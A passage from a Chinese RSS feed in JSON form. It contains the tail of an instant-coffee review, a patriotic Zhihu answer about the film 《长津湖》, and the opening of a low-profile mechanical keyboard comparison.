冷萃咖啡液#红色石端正庄园」，这款咖啡液非常适合做奶咖，其实我建议任何咖啡液都一定尝试奶咖，不要指望它能还原出一杯新鲜的美式，你得到的将会只是一言难尽的大杂烩。</p>\n<p>这款咖啡液使用的是云南保山咖啡豆，有明显的坚果和巧克力风味，异味感也较弱。</p>\n<h3>不建议把特调咖啡当口粮，但可以尝个鲜</h3>\n<p>无论冻干还是咖啡液，它们在萃取、回收和封装保存的过程中总会对咖啡原有的风味产生负面影响，可就像不新鲜的食材可以用重油重盐烹饪来弥补，这些遗憾也可以用所谓的「花式特调」来补全。但我不认为它们可以被作为解决方案，首先我对一切添加剂持保留态度，其次当我们想要来一杯花式特调的时候通常是想要喝一杯「好喝的含咖啡因饮料」，而它们只是对速溶咖啡的缺点稍加隐瞒，是远远达不到「好喝」程度的，所以我建议你不要抱太大希望试图将其作为「哪怕缺少条件也能拥有的一杯好喝饮料」。</p>\n<p>其次，就我个人体验上来讲，花式特调的速溶明显咖啡因含量不足，你几乎要两份的量才能拥有一杯足量的生命水，除非你只想喝这种带咖啡味儿的香精饮料，不然还是建议想要解馋的时候叫杯二十块不到的瑞幸满意度都会更高。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/ada140bb04e319b7dd7d6d28d4b860ac.jpg\"></figure><p>但尝鲜还是可以的，我推荐的是永璞的蜜桃乌龙冻干，首先本来乌龙茶香与咖啡就是比较契合的一个味道，两者相辅相成不会冲突，然后有一股微弱的蜜桃香气飘浮在里面。相比「特调」这种略显复杂的描述，我更喜欢称之为趣味，让普通又苦涩的咖啡多了一些乐趣和层次，非常适合某个烦闷的午后用来轻松一刻。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/73f36a27f8b8f1bf97d609aad7721d97.jpg\"><figcaption>瑞幸的花式特调你都不知道被调的是风味还是咖啡</figcaption></figure><p>其实从某种程度上来讲，我觉得雀巢那种香精三合一应该算是最古早的特调，而我这次购买的瑞幸花漾特调有一个与之相同的特点，就是「放肆」。前面之所以推荐永璞是因为它很克制蜜桃乌龙风味与咖啡本味之间的比例，淡化前者成为后者延绵过程中的点缀。但瑞幸的这些莫名其妙的什么菠萝、玫瑰、蔓越莓等风味几乎是和咖啡本味混杂在一起的，你不能说它难喝，但它已经不像是咖啡了。</p>\n<p>有趣的是在这次挑选测品的时候我无意间的决定让我发掘出了日后家中常备的饮料，它们分别是永璞的宇治抹茶液和三顿半的茶粉（我买的是混合装，每一种口味都很棒）。我一直觉得东方的茶和西方的咖啡都是大自然的瑰宝，可能是因为咖啡因的提神效果，也有可能是因为自己年纪大了，不过相比咖啡，我对茶更挑剔一些——喜苦不喜涩，所以通常我都更喜欢类似于乌龙、普洱这一类的茶以及宇宙之光抹茶。</p>\n<p>永璞的抹茶非常的浓郁，不是那种加了工业香精的浓郁，而是抹茶本有的醇厚，而且因为已经是液体的缘故，可以直接与冰牛奶搅和做出一杯非常好喝的冰无糖抹茶拿铁，其实你如果喜欢抹茶，就应该知道无糖类的抹茶饮料要想好喝对抹茶的品质要求是非常严苛的。</p>\n<p>至于三顿半的茶粉也是如此，它们同样用了和冻干咖啡一样的萃取、干燥和封装工艺，所以你可以得到一杯非常浓郁醇厚且本味的茶汤，而且它们易溶性非常好，很适合用来做茶拿铁。如果你不是非常想要尝试特调咖啡又想要喝上好喝的相对健康饮料，这两款速溶茶饮非常推荐你尝试。甚至作为一个坚定的新鲜萃取咖啡爱好者，我觉得速溶茶才应该是速溶饮料的归途——而速溶咖啡只能是不得已的解决方案。</p>\n<h2>最后</h2>\n<p>这篇文章立意明确——速溶咖啡评测，但在撰写过程中我花了很长时间思考它的形式。最开始我是想要写一篇理中客的速溶咖啡评测，结果发现根本做不到，首先我想要推荐的都不是销量这个客观数据最高的，其次当我邀请不同的朋友来尝试这些咖啡的时候，包括我在内每个人的喜好都是不尽相同的。所以我就放弃了，也放飞了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/30/10d364d9429f5e9790f69cc60db4a4ec.jpg\"><figcaption>它们真的就只是咖啡因</figcaption></figure><p>我没有逐一介绍，也未曾像网上大部分类似的文章一样预设评测标准然后打分排序，站明一个「奶咖爱好者」的立场后，我只推荐了我最喜欢的几款。至于还有几款甚至都没有提到的例如雀巢的「馆藏拿铁」和经常看到的「职人咖啡」，我只能说咖啡这玩意儿在大部分时候都是一分钱一分货了，当冻干敢卖到近三块钱一克的时候，你就想也别想那些一块乃至几毛钱的产品了，没有智商税，也没有尚未被挖掘的宝藏。</p>\n<p>最后再回到「移动咖啡馆」这个话题，我不知道你会不会觉得，咖啡是一种带情绪的饮料，就是你回想一下你每天的第一杯咖啡——可能是如都市丽人那般端着纸杯穿行在街头，可能是工位落座后第一口「鸡血」，也有可能像我这样「一天的开始」，当你习惯了咖啡后，你一定也会有固定喝咖啡的场景和时间，最后它就会变成一场私密的仪式、状态切换的旋钮和「只要我觉得」的快乐。</p>\n<p>所以移动咖啡馆的核心不在于「如何移动」，而是「咖啡常相伴」。我们总是需要一些一定要做但又意义泛泛的事儿，哪怕只是喝一杯咖啡，我希望无论是几毛钱的香精速溶还是数十更甚的精品鲜萃，保留这个习惯，并抓住一切机会去持续它。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69062"},{"title":"电影《长津湖》中的哪些细节最让你印象深刻？","date":"2021-10-07 02:42:51","description":"\n<p></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f84e97e3df75dad54a330a2f0a3ec2d0_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"632\" data-rawheight=\"350\" data-watermark=\"watermark\" data-original-src=\"v2-f84e97e3df75dad54a330a2f0a3ec2d0\" data-watermark-src=\"v2-6346f6c021c74d1cc386bef0781636ed\" data-private-watermark-src=\"v2-8cb7ef8a32c2be32722c5539a9b45da4\"></p>\n<p>「疼……疼死我了……别……别把我……别把我一个人留在这儿……」</p>\n<p>火光映天，炸弹轰鸣，「人人那个都说哎，沂蒙山好啊」，《沂蒙山小调》响起，整个世界都仿佛安静了下来。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cdf79ea1310c6871a9d3ddb10508c2bd_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"458\" data-rawheight=\"212\" data-watermark=\"watermark\" data-original-src=\"v2-cdf79ea1310c6871a9d3ddb10508c2bd\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>七连的第17名兵、经历那么多生死战役的老排长——雷公永远倒下了……牺牲前，他唯一的愿望就是不想一个人留在异国他乡。</p>\n<p>昨天，走进电影院观看《长津湖》，看到这里，我再也绷不住了，彻底破防，泪水决堤。</p>\n<p>作为军人，雷公（胡军 饰）冒着枪林弹雨、驾驶车辆运送标识弹冲进敌营，浑身已被战火烧得面目全非，却全然不顾疼痛。然而，牺牲前，他回归了自己，感受到了身体上的疼痛，想回家了。雷公的愿望何尝不是那些留在异国他乡的志愿军英雄的遗愿呢？</p>\n<p>雷公，七连现役中最老的同志、元老人物，在枪林弹雨中与七连一起成长，教出了伍百里、伍千里等连队的一代代骨干，外表严厉、内心炽热的山东大汉，真实、豪爽、耿直、憨厚、温暖的老班长、老兵的样子。</p>\n<p>看到他，也许很多人都会想起自己的老班长。</p>\n<p>这正是影片《长津湖》的可贵之处：<b>塑造的英雄真实、接地气。英雄绝不是从天而降，他们都经历了磨砺、经历了考验，先是一个个活生生的人，然后才是成长、英勇、升华。</b></p>\n<p>这就是真实的中国军人的样子、英雄的样子！不是高高在上、高不可攀，而是这样的简单纯粹，扛起崇高的使命：保家卫国！为了保卫母亲和孩子，为了打败杀我同胞、侵我边境的美帝野心狼。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5dcfd8ec4dfcafce48de9dea1f820889_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-5dcfd8ec4dfcafce48de9dea1f820889\" data-watermark-src=\"v2-6687aa792e71020c57a32166dfd55701\" data-private-watermark-src=\"v2-a5a85e1e62eb767162c75b2e17d24162\"></p>\n<p>——因为懂得这个崇高的使命，所以，伍千里（吴京 饰）在接到归队命令后，毫不犹豫打起背包就出发。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e00ffd9bdb3d627d1d49475f4d5eab3c_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"645\" data-rawheight=\"339\" data-watermark=\"watermark\" data-original-src=\"v2-e00ffd9bdb3d627d1d49475f4d5eab3c\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>本打算给父母盖个房子，摆脱世世代代在渔船上漂泊的孤苦生活，再给十年没见的三弟伍万里说个媳妇，一家人安安稳稳地过日子。但现在，有人想破坏这份安稳的生活，有人想夺去这份来之不易的和平。祖国的号召，战士们打起背包奔赴战场，保家卫国，义不容辞。</p>\n<p>若有战，召必回！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-8f4838c10af6b048ac199e89d9d14c1c_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-8f4838c10af6b048ac199e89d9d14c1c\" data-watermark-src=\"v2-d65c3132ca0d8c2c36402940d6f02dd9\" data-private-watermark-src=\"v2-ca9894e60122152a2f66e607aaa1b343\"></p>\n<p>——因为懂得这个崇高的使命，指导员梅生（朱亚文 饰）明明已经退伍，可以告别枪林弹雨的战争和流血，在上海过上惬意自在的生活，却在志愿军队伍出发前，狂蹬了十几个小时自行车归队了。</p>\n<p>指导员梅生是连队里唯一的文化人，当然不是天生好战，如果没有战争，他可能会过上书香生活，与深爱着的妻子和女儿一起其乐融融，但是为了保卫祖国，为了家人和同胞来之不易的安宁，他不惧怕任何流血牺牲、义无反顾！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fb76a49591b03bd42e9a8b237d9cff2a_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"508\" data-rawheight=\"259\" data-watermark=\"watermark\" data-original-src=\"v2-fb76a49591b03bd42e9a8b237d9cff2a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>不得不说，这部影片成功反映了我军最真实的政工干部形象：儒雅而有血性。纠正了以往一些影片故意边缘化政工干部的偏差，是为政工干部的一次正名：他们平时可以团聚凝聚官兵、与大家打成一片；上了战场就是一名充满智慧、打得了硬仗、不惧流血牺牲的勇士。</p>\n<p>——因为渐渐懂得这个崇高的使命，伍万里从调皮捣蛋的乡村少年，到远走他乡，跟随部队参军入伍！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2a4de387ae5b10714761446cd7a1eeb1_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1070\" data-rawheight=\"564\" data-watermark=\"watermark\" data-original-src=\"v2-2a4de387ae5b10714761446cd7a1eeb1\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>伍万里（易烊千玺饰）是个十足的新兵蛋子，刚加入队伍时显得极度不适，第一次听到信号弹的声音都会被吓一大跳、在车厢里被大伙调教逗乐而想逃跑、同伴牺牲让他痛苦万分……</p>\n<p>在雷公、连长和战友们的帮助下，在艰苦的战斗中磨砺，他成长得很快，与敌人近距离搏杀，在战场上冲锋陷阵。他从一个喜欢打水漂的野孩子成长为投弹精准的一线战士，不但认清了战争的残酷本质，而且还读懂了军人的信念，长出了七连的骨头！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-32d868a64d6f7052a42705348bdaba32_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"480\" data-rawheight=\"243\" data-watermark=\"watermark\" data-original-src=\"v2-32d868a64d6f7052a42705348bdaba32\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>最可贵的就是成长。</p>\n<p>——因为肩负这个崇高的使命，真实的志愿军将士们不畏艰难困苦，英勇顽强、舍生忘死，抛头颅、洒热血，甘愿为祖国和人民牺牲一切，只为了最后的胜利。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e7f095f00c17a43d060532eb56c1eda7_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"805\" data-rawheight=\"733\" data-watermark=\"watermark\" data-original-src=\"v2-e7f095f00c17a43d060532eb56c1eda7\" data-watermark-src=\"v2-7803064cfd6a8743e99d77ad8a96e103\" data-private-watermark-src=\"v2-091bee1b28a733663cea94400ec7bea5\"></p>\n<p>犹如影片中指导员梅生的一番话：</p>\n<p><b>「我女儿问我，为什么我要去打仗？这场仗我们不打，就是我们的下一代要打。我们出生入死，就是为了让他们不打仗。」</b></p>\n<p>时至今日，还会有人在怀疑抗美援朝！这场伟大的战争到底值不值？这么惨烈的牺牲，有必要么？曾经有个别公知大V公然叫嚣：假如没有抗美援朝，我们照样不是过着安稳的日子？</p>\n<p><img src=\"https://pic3.zhimg.com/v2-62931bfe71bfc1015025ae59415afd0b_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"500\" data-rawheight=\"279\" data-watermark=\"watermark\" data-original-src=\"v2-62931bfe71bfc1015025ae59415afd0b\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>真的是这样吗？我们生活在这个怀疑的时代，需要怀疑的精神！可是有点历史常识的人，就会注意到如下细节——</p>\n<p>1950年6月27日，美军第七舰队驶入台湾海峡，公然干涉中国内政。8月27日，美军战机5批13架次，侵入中国东北境内的辑安（今集安）、临江、安东（今丹东）地区上空轰炸扫射，炸死中国居民3人，炸伤21人。两天之后的8月29日，美国空军飞机又两次入侵中国宽甸县上空进行侦察扫射，杀死中国居民4人，杀伤7人。</p>\n<p>当我们的同胞被杀，当国家主权被侵略、被践踏，当战火烧到我们的家门口！<b>试问，任何一个有良知的中国人能坐视不管么？！试问，我们除了拿起武器保家卫国，我们还能选择做什么？！</b></p>\n<p>正如歌曲《我的祖国》唱得那样：<b>「朋友来了有好酒，若是那豺狼来了，迎接它的有猎枪……」</b></p>\n<p>影片中有这么一个细节：在万里刚入伍的列车上，因为不满哥哥千里的严格要求，万里闹别扭“不干了”，拉开列车门，眼前出现的却是在巍峨群山中盘桓的长城，这一幕让战士们深受震撼，也点出了抗美援朝的意义所在——</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4460729925acdc9e4d4caf9bad081f10_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"450\" data-watermark=\"watermark\" data-original-src=\"v2-4460729925acdc9e4d4caf9bad081f10\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>万里长城永不倒。</b>在中国军人的身后，是祖国的大好河山，是浴血奋战换来的和平生活，中国军人要永远做那个护卫祖国和人民的钢铁长城！</p>\n<p><b>「打得一拳开，免得百拳来。」</b>虽然新中国刚刚成立，和平来之不易，但为了后代的国泰民安，这是必须作出的战略决策。领导人的反复考量与果断决策，真实反映了历史史实。</p>\n<p>是的，《长津湖》在这些史实细节上处理上颇具匠心。</p>\n<p>有人说，《长津湖》对外军部分的刻画略显刻板，还有人说画面上有人海战术……客观上说，是存有一些瑕疵，但剑客想说，这瑕不掩瑜，这绝不是我们关注的重点。</p>\n<p>因为，在处理电影艺术和历史背景融合的取舍——三位导演既要交代明白历史背景又要使电影具有观赏性，增强历史纵深感，能够使我们更快速进入电影叙事之中，这有难度且并不容易。<b>有一些艺术加工和画面展现，完全可以理解。</b></p>\n<p><b>重要的是，志愿军将士们已通过他们的英勇战斗，让美军认识到这是一支战术素养极高、战斗意志极其顽强的队伍。所以，那些钻牛角尖式的讨论，毫无意义。</b></p>\n<p>重要的是，我们能够通过影片获得什么，<b>感知那个时代为了祖国和人民舍身取义、毅然决然英勇赴死的英雄，感知他们身上闪烁的精神品质，感知我们如今幸福生活的来之不易！</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-94c006a2e537f534b06fc7e9a174d954_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"255\" data-watermark=\"watermark\" data-original-src=\"v2-94c006a2e537f534b06fc7e9a174d954\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>通过电影的铺陈，使我们渐渐明白——敌我双方的军备武器悬殊，岂止天壤之别。对手异常地强大、战斗异常地艰苦。</p>\n<p>以美军陆战1师为首的联合国军，是美国海军陆战队中资历最老、规模最大的两栖步兵师，在长津湖战役之前，未尝败绩。他们的战机、坦克、导弹一应俱全，他们开着战机在天空中肆意飞行。我军没有制空权，白天隐秘，晚上行军，时刻面临着敌机轰炸的巨大危险。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c58231d2fa7fba2cbb718344df6763a5_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"609\" data-watermark=\"watermark\" data-original-src=\"v2-c58231d2fa7fba2cbb718344df6763a5\" data-watermark-src=\"v2-f15d645e1ecbc69a2183b75fe06f2649\" data-private-watermark-src=\"v2-4652bb52da85bcc5257d21a493285cc7\"></p>\n<p>影片中，有一幕对比让人印象深刻：零下三十度的冰天雪地里，中方志愿军埋伏在冰冷的石头堆里，每天每人只有一个硬得像石头的土豆充饥。而美军则在营地里穿着棉大衣，吃着大鱼大肉，听圣诞歌曲，闲聊着要怎样回家过节。</p>\n<p>然而一到了战场上就是另一副场景，志愿军将士与敌人以命相拼，用钢枪和生命铸就的铁血荣光，这是媒体曾经的战斗描述：</p>\n<p><b>「有的刺刀折断了，就抱住敌人摔打，用拳头、用牙齿，直到拉响身上的手榴弹；有的被燃烧弹击中，两条胳膊像铁钳一样箍住敌人身体，直到烧成焦炭与敌人同归于尽……」</b></p>\n<p>前沿阵地上，经常是以伤残严重的连对抗敌军齐装满员的团，几乎没有炮火支援，弹药常常补充不上；一桶水、一箱弹药、一个苹果常常要牺牲好几条人命还不一定送得上去，在这种情况下取得的胜利，中国军人用生命创造了一个又一个奇迹。</p>\n<p><b>这就是伟大的抗美援朝精神！</b></p>\n<p>这就是：祖国和人民利益高于一切、为了祖国和民族的尊严而奋不顾身的爱国主义精神，英勇顽强、舍生忘死的革命英雄主义精神，不畏艰难困苦、始终保持高昂士气的革命乐观主义精神，为完成祖国和人民赋予的使命、慷慨奉献自己一切的革命忠诚精神，以及为了人类和平与正义事业而奋斗的国际主义精神。</p>\n<p>就是这群穿着单衣、却拥有这个世界上<b>最坚强意志</b>的志愿军将士们，在武器装备极其不对称的条件下，让不可一世的美军节节溃退，用钢少气多的惊人意志打下了抗美援朝这场立国、立威之战。</p>\n<p>这是美国人永远不懂的数字对比，却是中国人最深刻懂得的数字意蕴。对于兰晓龙的宇宙粉丝来说，七连也许正是钢七连的前身，因为这个数字吻合上了：</p>\n<p>雷公是第17，伍百里161，伍千里是162，伍万里677……</p>\n<p><img src=\"https://pic2.zhimg.com/v2-6a3f8d5618e648ae26c53d6932d45457_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"480\" data-rawheight=\"268\" data-watermark=\"watermark\" data-original-src=\"v2-6a3f8d5618e648ae26c53d6932d45457\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>这个计数在《士兵突击》中也曾出现，许三多入伍的时候，他是钢七连第4956名新兵。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-c76461fd6c523eb7fd5bb833e9b17dd8_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"585\" data-watermark=\"watermark\" data-original-src=\"v2-c76461fd6c523eb7fd5bb833e9b17dd8\" data-watermark-src=\"v2-37f4a3c864c0b4f0f10bf7d23d7d063f\" data-private-watermark-src=\"v2-8622095c3a216e421b3b09f397a0ac12\"></p>\n<p>从抗美援朝到和平年代，七连依然在延续，数字在增加，精神血脉在传承。</p>\n<p>是的，在中国军人的战斗哲学中，数字，绝不是数字本身。</p>\n<p>今天，让我们记住国家档案馆统计的一组数字：<b>197653</b>名志愿军烈士永远长眠在异国他乡！197653不仅仅是数字，更是一个个<b>鲜活的面孔</b>，一座座<b>中国军人的永恒丰碑</b>。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a39ca65e15809ec658ed726c491c069c_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"853\" data-watermark=\"watermark\" data-original-src=\"v2-a39ca65e15809ec658ed726c491c069c\" data-watermark-src=\"v2-ac2ae65b073ea9fee169b7bab533f609\" data-private-watermark-src=\"v2-2d370fe9bb9e1c50ab38afff8bdde794\"></p>\n<p>看完电影，我的内心久久难以平静，我想用魏巍的课文《谁是最可爱的人》最后的结尾送给亲爱的朋友们——</p>\n<p>「亲爱的朋友们，当你坐上早晨第一列电车驰向工厂的时候，当你扛上犁耙走向田野的时候，当你喝完一杯豆浆、提着书包走向学校的时候，当你坐到办公桌前开始这一天工作的时候，当你往孩子口里塞苹果的时候，当你和爱人一起散步的时候……</p>\n<p>朋友，你是否意识到你是在幸福之中呢？你也许很惊讶地说：这是很平常的呀！</p>\n<p>可是，从朝鲜归来的人，会知道你正生活在幸福中。</p>\n<p>请你意识到这是一种<b>幸福</b>吧，因为只有你意识到这一点，<b>你才能更深刻了解我们的战士在朝鲜奋不顾身的原因</b>。」</p>\n<p>致敬，向所有的英烈！</p>\n<p>致敬，向最可爱的人！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-378018133dcfcb91136e8a77b1e0419f_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"512\" data-rawheight=\"288\" data-watermark=\"watermark\" data-original-src=\"v2-378018133dcfcb91136e8a77b1e0419f\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>▲新时代戍边官兵</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/san-jian-ke-52-28?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">三剑客</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/488769477/answer/2156921582?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1030 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/490333985?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">电影《长津湖》最大的遗憾是什么？</a><br><a href=\"http://www.zhihu.com/question/488992270?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2021 国庆档电影《长津湖》？</a><br>\n","link":"http://www.zhihu.com/question/488769477/answer/2156921582?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"有哪些好用的键盘值得推荐？","date":"2021-10-06 16:50:45","description":"\n<p>各位好，我是 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/46a389fe3d4368fd1371ec3069be1267\" data-hash=\"46a389fe3d4368fd1371ec3069be1267\" data-hovercard=\"p$b$46a389fe3d4368fd1371ec3069be1267\">@Domino</a>。</p>\n<p>非常荣幸参加知乎的翻牌众测活动。</p>\n<p>每个人对“好用”这个词的定义都是不一样的。</p>\n<p>我遇到过太多这样的朋友：看了我的文章，最后买了某机械键盘。但是收到后，发现键盘太高了，手腕抬着难受。又或者用惯了笔记本键盘，到手后发现常规的机械键盘键程太长，按起来太费劲。</p>\n<p>对这部分用户来说，常规的机械键盘是不好用的。我认为可以考虑“矮轴”机械键盘。</p>\n<p><br></p>\n<p>“矮轴”顾名思义就是比常规轴要“矮”的轴体。以cherry轴举例，常规轴体高度为18.5MM，但是cherry的矮轴仅为11.9MM</p>\n<p><img src=\"https://pic4.zhimg.com/v2-452130033276af3840d82bd7892d4cf7_720w.jpg?rss\" data-rawwidth=\"561\" data-rawheight=\"367\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-452130033276af3840d82bd7892d4cf7\" data-watermark-src=\"v2-05cc91cd85bf4fb064a5caf917123e0b\" data-private-watermark-src=\"\"></p>\n<p>如果在键盘上更直观的展示，就是这个样子的：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d60e9f949bf81f8764f3d8f7c513f2aa_720w.jpg?rss\" data-rawwidth=\"693\" data-rawheight=\"434\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d60e9f949bf81f8764f3d8f7c513f2aa\" data-watermark-src=\"v2-d7bbc08282bfdf14225708c212159850\" data-private-watermark-src=\"\"></p>\n<h2>为了可以知道哪些矮轴键盘好用，我把常见品牌的矮轴键盘全部都买了回来，型号如下：</h2>\n<ul>\n<li>keychron/京造 K3：茶轴，佳达隆矮轴（十字轴心）</li>\n<li>keychron/京造 K1：青轴，佳达隆矮轴（直插轴心）</li>\n<li>达尔优EK868：茶轴，凯华矮轴（直插带钩轴心）</li>\n<li>RK速写96：茶轴，凯华矮轴（直插轴心）</li>\n<li>ikbc S200：青轴，TTC矮轴（十字轴心）</li>\n<li>ikbc S300：茶轴，TTC矮轴（十字轴心）</li>\n<li>酷冷至尊SK621：红轴，Cherry矮轴（十字轴心）</li>\n<li>雷神璃月 KC3094：红轴，高特矮轴（十字轴心）</li>\n</ul>\n<blockquote>同品牌相同设计不同配列的键盘没有购入，如达尔优EK869</blockquote>\n<p><img src=\"https://pic4.zhimg.com/v2-fec72247653a40c25f81f98486cba66c_720w.jpg?rss\" data-rawwidth=\"4000\" data-rawheight=\"4000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-fec72247653a40c25f81f98486cba66c\" data-watermark-src=\"v2-d3bc986b42b0204913e8e115c765617b\" data-private-watermark-src=\"v2-c032b857d1f6a0b4889a014c570fb907\"></p>\n<h2><b>依旧把结论放在最上面。</b></h2>\n<p><b>只使用win电脑的用户：</b></p>\n<p>推荐在 <b>雷神璃月KC3094，京造K3、京造K1、ikbc S200、ikbc S300 </b>之间选购。</p>\n<blockquote>这几个之间的挑选建议主要参考下图中的配列和价格，其次是看下文中的使用体验。</blockquote>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429122230337380352\"></a><a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429122428383879168\"></a><a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429122317494947840\"></a><a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429122491294248960\"></a><a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429122532918554624\"></a><p><b>只使用mac电脑的用户：</b></p>\n<p>推荐在 <b>京造K3、京造K1、达尔优EK868 </b>之间选购</p>\n<blockquote>这几个之间的挑选建议主要参考下图中的配列和价格，其次是看下文中的使用体验。K1不太推荐青轴。</blockquote>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1429122125320368128\"></a><p><br></p>\n<p><b>win与mac都要使用的用户：</b></p>\n<p>推荐在 京造K3、京造K1 之间选购，如果在WIN下不使用多媒体按键，还可以加上达尔优EK868。</p>\n<blockquote>这几个之间的挑选建议主要参考下图中的配列和价格，其次是看下文中的使用体验。K1不太推荐青轴。</blockquote>\n<p><br></p>\n<h2>所有的键盘配置信息与注意事项如下：</h2>\n<p><img src=\"https://pic3.zhimg.com/v2-e6b23105e5fcebc4c8678ecdfa7eb828_720w.jpg?rss\" data-rawwidth=\"1644\" data-rawheight=\"1154\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e6b23105e5fcebc4c8678ecdfa7eb828\" data-watermark-src=\"v2-7066277aff44d0cb4f603875c96bb0fe\" 